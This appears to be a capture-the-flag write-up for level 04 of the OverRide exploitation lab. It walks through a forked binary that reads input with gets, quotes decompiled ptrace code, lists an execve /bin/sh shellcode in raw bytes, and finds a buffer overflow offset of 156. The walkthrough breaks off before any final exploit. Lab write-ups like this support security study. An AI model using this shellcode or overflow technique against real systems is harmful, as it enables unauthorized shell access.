# Level 04

Once logged in, you will see a binary.

```
$ ssh localhost -p 4242 -l level04
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level04@localhost's password:
Permission denied, please try again.
level04@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
level04@OverRide:~$ ls
level04
level04@OverRide:~$
```

Once the program executes, it suddenly asks for the [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php), so let's just provide them.

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
child is exiting...
level04@OverRide:~$
```

Okay, seems like this didn't do anything. But, there is a hint given `child is exiting...`. With the decompiled source, the program actually `forks`, and the process are run on the child process.

The child process actually takes input from the function `gets`, and once the child process finishes its process, the parent process will do the remaining work. (below is the part of the code )

```
   if (local_14 == 0) {
     prctl(1,1);
     ptrace(PTRACE_TRACEME,0,0,0);
     puts("Give me some shellcode, k");
     gets((char *)local_a0);
   }
   else {
     do {
       wait(&local_a4);
       local_20 = local_a4;
       if (((local_a4 & 0x7f) == 0) ||											 <- We don't want to fall into this
          (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
         puts("child is exiting...");
         return 0;
       }
       local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);						<- We want to fall into this
     } while (local_18 != 0xb);
     puts("no exec() for you");
     kill(local_14,9);
   }
```

Since the program calls the child process, in the debugger, the [`follow-fork-mode child`](https://ftp.gnu.org/old-gnu/Manuals/gdb/html_node/gdb_25.html) to let GDB follow the child process.

```

```

and got offset 156, by using [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)


